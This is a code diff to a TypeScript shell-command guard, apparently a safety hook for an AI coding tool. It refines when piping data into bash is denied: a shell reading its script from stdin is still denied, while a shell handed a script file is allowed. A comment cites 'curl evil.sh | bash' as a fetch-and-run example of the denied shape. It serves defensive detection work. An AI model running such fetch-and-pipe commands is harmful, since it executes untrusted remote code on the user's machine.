@@ -476,6 +476,54 @@ export function hasNetworkSource(upstream: string): boolean {
 // never supplied (#3433).
 export type PipeToInterpreterKind = 'exec' | 'exec-local' | 'interpreter';
 
+/**
+ * Does this shell receive a script FILE to run, rather than reading its script
+ * from stdin?
+ *
+ * `bash` executes stdin as the script only when it is handed neither a file
+ * operand nor an inline command. That single fact separates the two shapes
+ * this guard kept conflating (#3559):
+ *
+ *   curl evil.sh | bash              stdin IS the script      -> deny
+ *   printf data | bash ./known.sh    stdin is DATA for a file -> allow
+ *
+ * The second shape is how Claude Code invokes a user's statusline command, and
+ * how this repo's own test scripts drive individual hooks, so denying it gated
+ * TOOL SHAPE rather than danger.
+ *
+ * Two flags mean stdin is the script whatever else follows:
+ *   -c CMD   runs CMD; trailing words become $0/$@, never a file to execute
+ *   -s       literally "read commands from standard input"
+ * Both are matched inside short clusters (-xs, -sc) as well as alone.
+ */
+function hasFileOperand(target: string): boolean {
+  // Drop the interpreter word itself; what remains is bash's own argv.
+  let rest = target.replace(/^\S+\s*/, '').trimStart();
+
+  for (let hop = 0; hop < 16 && rest.startsWith('-'); hop++) {
+    const flag = /^(-{1,2}[^\s]*)\s*/.exec(rest);
+    if (!flag) break;
+    const word = flag[1];
+
+    // `--` ends option parsing: anything after it is an operand.
+    if (word === '--') return rest.slice(flag[0].length).trim().length > 0;
+
+    // -c or -s, alone or clustered, means stdin is the script.
+    if (/^-[^-]*[sc]/.test(word)) return false;
+
+    // These take a VALUE that is not the script; skip the value too, or it
+    // would be mistaken for the file operand.
+    if (word === '--rcfile' || word === '--init-file') {
+      rest = rest.slice(flag[0].length).replace(/^\S+\s*/, '').trimStart();
+      continue;
+    }
+
+    rest = rest.slice(flag[0].length).trimStart();
+  }
+
+  return rest.trim().length > 0;
+}
+
 export function pipesToShellInterpreter(cmd: string): PipeToInterpreterKind | null {
   let inSingle = false;
   let inDouble = false;
@@ -508,11 +556,21 @@ export function pipesToShellInterpreter(cmd: string): PipeToInterpreterKind | nu
     // match, then reduce it to the interpreter it will ACTUALLY run.
     const target = resolveInterpreterWord(cmd.slice(i + 1));
 
-    // stdin-as-script: always a deny, whatever the source. The source still
-    // decides which REASON we give, because telling someone to fetch to a file
-    // first is nonsense when nothing was fetched (#3433).
-    if (SHELL_EXEC_RE.test(target))
+    // stdin-as-script: a deny, but only when stdin actually IS the script.
+    // The source still decides which REASON we give, because telling someone to
+    // fetch to a file first is nonsense when nothing was fetched (#3433).
+    //
+    // #3559 narrowed this from "always a deny, whatever the source". It was not
+    // over-cautious, it was over-MATCHING: with a file operand present bash runs
+    // the file and stdin is data, so the deny fired on a shape that cannot
+    // execute piped bytes. A network source still denies even then, because
+    // fetching bytes to feed a local script is worth a stop on its own.
+    if (SHELL_EXEC_RE.test(target)) {
+      if (hasFileOperand(target)) {
+        return hasNetworkSource(cmd.slice(0, i)) ? 'exec' : null;
+      }
       return hasNetworkSource(cmd.slice(0, i)) ? 'exec' : 'exec-local';
+    }
 
     // stdin-as-data: a deny only when the bytes came off-machine. Local data
     // into `python3 -c` is log parsing, not RCE (#3096).
